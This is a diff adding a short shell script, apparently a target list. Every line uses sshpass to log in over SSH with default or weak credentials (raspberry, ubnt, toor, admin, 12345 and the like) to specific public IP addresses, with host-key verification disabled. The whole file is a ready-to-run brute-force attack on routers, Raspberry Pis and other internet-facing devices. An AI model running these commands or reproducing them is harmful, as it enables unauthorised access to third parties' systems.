@@ -1,0 +1,16 @@
+sshpass -p "raspberry" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@218.91.65.97
+sshpass -p "admin" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@218.91.65.97
+sshpass -p "ubnt" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no ubnt@218.91.65.97
+sshpass -p "password" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@218.91.65.97
+sshpass -p "toor" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@218.91.65.97
+sshpass -p "admin" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@5.188.10.76
+sshpass -p "user" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@123.21.124.124
+sshpass -p "Admin" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no Admin@202.137.155.204
+sshpass -p "1234" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@213.181.78.70
+sshpass -p "admin" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@218.173.17.118
+sshpass -p "ubnt" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no ubnt@143.255.141.73
+sshpass -p "qa6yo9km" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no qe1dg7bm@159.192.231.131
+sshpass -p "12345" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@179.104.27.84
+sshpass -p "super" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no super@156.223.163.210
+sshpass -p "12345678" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@201.247.45.62
+sshpass -p "admin" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@101.108.11.197
